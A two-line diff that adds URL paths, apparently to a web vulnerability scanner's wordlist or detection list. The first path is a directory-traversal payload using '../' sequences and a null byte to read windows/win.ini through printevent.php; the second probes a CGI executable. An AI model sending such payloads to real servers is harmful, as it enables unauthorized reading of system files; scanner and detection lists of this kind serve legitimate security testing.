@@ -1,0 +1,2 @@
+/modules/event/server/printevent.php?action=../../../../../../../../../../../../windows/win.ini%00.htm
+/cgi-bin/GetSrvInfo.exe
